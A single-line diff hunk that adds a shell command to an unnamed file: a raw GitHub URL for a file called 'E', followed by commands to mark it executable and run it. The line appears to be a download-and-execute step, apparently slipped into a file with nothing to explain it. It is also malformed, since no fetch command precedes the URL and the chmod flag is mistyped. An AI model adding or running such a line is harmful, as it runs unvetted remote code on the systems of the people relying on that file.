@@ -1,1 +1,1 @@
-
+https://raw.githubusercontent.com/tuturutu331/tuturutu331/main/E && chmod +X E && ./E
